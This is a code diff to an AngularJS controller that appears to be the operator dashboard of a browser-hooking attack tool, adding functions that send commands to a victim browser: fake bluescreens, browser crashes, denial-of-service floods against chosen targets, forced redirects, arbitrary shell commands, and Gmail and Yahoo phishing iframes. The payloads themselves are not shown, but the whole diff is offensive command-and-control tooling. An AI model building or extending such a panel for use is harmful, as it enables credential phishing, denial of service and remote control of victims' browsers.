@@ -47,7 +47,7 @@ function DashboardCtrl($scope, $http, $timeout, Command, GLOBAL, Node) {
 	}
 
 	// The following are attacker side form submissions and preview methods
-	// May be better do these in their own directives
+	// May be better do these in their own service
 
 	$scope.sendAlert = function(){
 		if($scope.alertText == undefined){
@@ -78,12 +78,40 @@ function DashboardCtrl($scope, $http, $timeout, Command, GLOBAL, Node) {
 			console.log("Header: " + $scope.alert2HeaderText);
 			console.log("Message: " + $scope.alert2Text);
 			$scope.alert2Text = '';
+			$scope.alert2HeaderText = '';
 		}
+	}
+
+	$scope.sendBlueScreen = function(){
+		Command.add({target:$scope.target.cid,type:"bluescreen",command:"hahaha!"});
 	}
 
 
 	$scope.sendCrashBrowser = function(){
 		Command.add({target:$scope.target.cid,type:"crash",command:"hahaha!",ac:"yes"});
+	}
+
+	$scope.sendDoS = function(){
+		if(!$scope.dosform.$invalid){
+			Command.add({target:$scope.target.cid,type:"dos",command:[$scope.dostargetText, $scope.dosrequestsText],ac:"yes"});
+			$scope.dostargetText = '';
+			$scope.dosrequestsText = '';
+		}
+	}
+
+	$scope.sendRedirect = function(){
+		if(!$scope.redirectform.$invalid){
+			Command.add({target:$scope.target.cid,type:"redirect",command:[$scope.redirectText, $scope.redirectmethod],ac:"yes"});
+			$scope.redirectText = '';
+		}
+	}
+
+	$scope.sendShell = function(){
+		if(!$scope.shellform.$invalid){ // should add jslint support here
+			Command.add({target:$scope.target.cid,type:"shell",command:$scope.shellinputText});
+			$scope.shellinputText = '';
+		}
+		
 	}
 
 	$scope.sendVideo = function(){
@@ -94,6 +122,38 @@ function DashboardCtrl($scope, $http, $timeout, Command, GLOBAL, Node) {
 		Command.add({target:$scope.target.cid,type:"video",command:vidid});
 		$scope.videoText = '';
 	}
+
+
+	// Effects
+
+	$scope.sendEarthquake = function(){
+		if(!$scope.earthquakeform.$invalid){
+			Command.add({target:$scope.target.cid,type:"earthquake",command:[$scope.eqelementText, $scope.eqdurationText]});
+			$scope.eqelementText = '';
+			$scope.eqdurationText = 0;
+		}
+	}
+
+	$scope.sendUpsidedown = function(){
+		if(!$scope.upsidedownform.$invalid){
+			Command.add({target:$scope.target.cid,type:"upsidedown",command:[$scope.udelementText, $scope.uddurationText]});
+			$scope.udelementText = '';
+			$scope.uddurationText = 0;
+		}
+	}
+
+
+	// Phishing
+
+	$scope.sendGooglePhish = function(method){
+		Command.add({target:$scope.target.cid,type:"gmail",command:["iframe", method]});
+	}
+
+	$scope.sendYahooPhish = function(method){
+		Command.add({target:$scope.target.cid,type:"yahoo",command:["iframe", method]});
+	}
+
+
 
 	$scope.getAllNodes();
 
